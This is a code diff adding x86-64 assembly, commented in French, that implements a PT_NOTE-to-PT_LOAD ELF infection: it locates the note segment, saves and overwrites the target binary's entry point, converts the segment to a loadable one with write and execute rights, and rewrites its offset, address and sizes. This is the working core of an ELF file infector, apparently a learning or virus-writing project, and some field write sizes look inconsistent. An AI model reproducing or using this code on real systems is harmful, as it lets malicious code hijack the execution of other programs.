@@ -261,3 +261,148 @@ parse_port_done:
     mov rsi,0
     mov rdx,0
     syscall
+
+;========= Trouver segment NOTE  ========= 
+
+mov r15, buffer
+
+    xor rcx, rcx
+    xor rdx, rdx
+    movzx rcx, word [buffer + 0x38]   ; e_phnum lu dynamiquement dans le header ELF
+    mov rbx, 64    ; file header
+    mov dx,  56 ; tailles des segments
+
+    loop_seg:
+        add rbx, rdx                  
+        dec rcx                        
+        xor r13, r13      
+        mov r13d , dword [r15 +rbx] 
+        cmp dword [r15 +rbx], 0x4  ; valeur du PT_NOTE
+        je pt_note_ok
+        cmp rcx, 0
+        jg loop_seg
+
+
+        jmp error 
+
+    pt_note_ok:
+
+    mov [offset_tp], rbx ; Offset du PT_NOTE !!!! 
+    
+    xor rcx,rcx
+    xor rax, rax
+
+    mov rax, [exagereted]
+    add rax, [file_size]
+    mov [new_vaddr], rax
+
+
+    modification_file:
+    xor rax,rax
+    mov rdi, [file_descriptor] ; meme premier arg pour toutes les autres fonctions , economise 20 lignes
+
+;=============== Get old entry point =================
+    mov rax, 8          ; lseek curseur
+    mov rsi, 0x18     ; offset jusqu'au entry point
+    mov rdx, 0          
+    syscall     
+
+    mov rax, 0          ; read 
+    mov rsi, old_entry_point  ; adresse où stocker l'ancien entry point
+    mov rdx, 8          ; taille de l'entrée à lire
+    syscall
+
+;=============== change entry point =================
+    mov rax, 8          ; lseek curseur
+    mov rsi, 0x18     ; offset jusqu'au entry point
+    mov rdx, 0          
+    syscall       
+
+    mov rax, 1         
+    mov rsi, new_vaddr   ; offset + valeur exagéré( c000000)
+    mov rdx, 8 
+    syscall 
+
+; =============== PT NOte to PT LOAD =================
+    mov rax, 8          
+    mov rsi, [offset_tp]     
+    mov rdx, 0          ; type 
+    syscall       
+
+    mov rax, 1         
+    mov rsi, tp_load 
+    mov rdx, 1 
+    syscall    
+
+; =============== Changement droit  =================
+    mov rax, 8          
+    mov rsi, [offset_tp]  
+    add rsi , 4    ; Droit 
+    mov rdx, 0         
+    syscall       
+
+    mov rax, 1         
+    mov rsi, droit_write_exe   
+    mov rdx, 1 
+    syscall             
+
+; =============== Address offset  =================
+    mov rax, 8          
+    mov rsi, [offset_tp]  
+    add rsi , 8   ; offset
+    mov rdx, 0          
+    syscall       
+
+    mov rax, 1         
+    mov rsi, file_size  
+    mov rdx, 3 
+    syscall         
+
+; =============== Virtual address  =================
+    mov rax, 8          
+    mov rsi, [offset_tp]  
+    add rsi , 16   ; vaddr
+    mov rdx, 0        
+    syscall       
+
+    mov rax, 1         
+    mov rsi, new_vaddr
+    mov rdx, 4 
+    syscall       
+
+; =============== Taille to exe  filesiz =================
+    mov rax, 8         
+    mov rsi, [offset_tp]  
+    add rsi , 32   ; taille a lire file
+    mov rdx, 0
+    syscall       
+
+    mov rax, 1         
+    mov rsi, taille_exagereted  
+    mov rdx, 3 
+    syscall          
+
+; =============== Taille to exe memsiz =================
+    mov rax, 8         
+    mov rsi, [offset_tp]  
+    add rsi , 40  ; taille a lire mem
+    mov rdx, 0          
+    syscall       
+
+    mov rax, 1         
+    mov rsi, taille_exagereted   
+    mov rdx, 3 
+    syscall         
+
+; =============== p align =================
+    mov rax, 8        
+    mov rsi, [offset_tp]  
+    add rsi , 48  ; alignement
+    mov rdx, 0         
+    syscall       
+
+    mov rax, 1
+    mov rsi, p_align
+    mov rdx, 8         ; p_align est un uint64_t
+    syscall
+
